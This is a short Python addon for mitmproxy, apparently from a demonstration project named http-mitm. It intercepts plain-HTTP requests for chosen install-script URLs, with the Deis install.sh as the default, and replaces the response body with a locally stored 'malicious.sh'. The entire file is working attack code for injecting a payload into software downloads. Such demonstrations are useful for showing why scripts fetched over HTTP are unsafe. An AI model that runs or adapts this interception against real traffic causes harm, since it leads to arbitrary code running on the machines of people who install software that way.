# rewrite_payload.py
# http-mitm
# Author: Rushy Panchal
# Date: December 22nd, 2017
# Description: Rewrite payload of the request to a malicious shell script.

import os

from mitmproxy import http

ATTACK_URLS = frozenset(
  filter(str, os.getenv('MITM_ATTACK_URLS', '').split(',')))
if not len(ATTACK_URLS):
  ATTACK_URLS = frozenset({
    "http://deis.io/deisctl/install.sh",
    })

MALICIOUS_SCRIPT_PATH = os.getenv('MALICIOUS_SCRIPT', 'malicious.sh')

with open(MALICIOUS_SCRIPT_PATH, 'r') as f:
  MALICIOUS_SCRIPT = f.read().encode('utf8')

def response(flow):
    if flow.request.pretty_url in ATTACK_URLS:
        flow.response.content = MALICIOUS_SCRIPT
